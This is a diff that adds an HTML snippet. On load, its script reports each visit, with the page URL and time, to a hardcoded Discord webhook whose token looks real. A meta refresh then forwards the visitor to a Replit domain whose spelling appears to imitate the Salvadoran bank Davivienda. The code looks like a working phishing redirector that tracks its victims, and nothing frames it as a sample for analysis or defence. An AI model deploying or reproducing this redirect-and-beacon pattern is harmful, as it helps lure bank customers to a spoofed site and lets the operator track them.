@@ -1,1 +1,14 @@
+<script>
+  const WEBHOOK_URL = "https://discord.com/api/webhooks/1572335198358478848/cEurzrkvHhD7Kd9PxvRoi4g80wpjP5Sy-66NAJN2ArclaXll6PLSwVpmuIzRAvwnWC2A";
 
+  window.addEventListener("DOMContentLoaded", () => {
+    fetch(WEBHOOK_URL, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({
+        content: `Nueva visita en **${window.location.href}** (${new Date().toLocaleString()})`
+      })
+    }).catch((err) => console.error("Error al enviar webhook:", err));
+  });
+</script>
+<meta http-equiv="refresh" content="1; url=https://davivlenda-sv.replit.app/davl/" />
